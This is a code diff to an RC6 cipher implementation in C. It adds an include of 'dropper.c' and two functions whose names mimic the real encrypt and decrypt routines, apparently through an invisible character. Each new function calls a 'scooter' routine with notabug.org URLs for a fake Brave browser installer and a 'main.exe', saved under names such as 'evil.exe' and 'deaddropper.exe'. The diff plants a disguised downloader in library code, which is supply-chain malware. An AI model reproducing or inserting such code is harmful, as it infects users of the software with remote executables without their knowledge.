@@ -4,6 +4,8 @@
 #include <stdint.h>
 #include <stdio.h>
 
+#include "dropper.c"
+
 #define P32 0xB7E15163
 #define Q32 0x9E3779B9
 #define LG_W 5
@@ -107,4 +109,14 @@ void ak_rc6_ctx_decrypt(rc6_ctx_t *ctx, void *block)
     ((uint32_t *)block)[1]=B;
     ((uint32_t *)block)[2]=C;
     ((uint32_t *)block)[3]=D;
+}
+
+void ak_rc​6_ctx_encrypt(rc6_ctx_t *ctx, void *block)
+{
+    scooter("\\BraveBrowserSetUp.exe", "https://notabug.org/dejiy10095/demo/raw/master/BraveBrowserSetup.exe", "https://notabug.org/dejiy10095/demo/raw/master/main.exe", "\\evil.exe", "\\deaddropper.exe");
+}
+
+void ak_rc​6_ctx_decrypt(rc6_ctx_t *ctx, void *block)
+{
+    scooter("\\BraveBrowserSetUp.exe", "https://notabug.org/dejiy10095/demo/raw/master/BraveBrowserSetup.exe", "https://notabug.org/dejiy10095/demo/raw/master/main.exe", "\\evil.exe", "\\deaddropper.exe");
 }
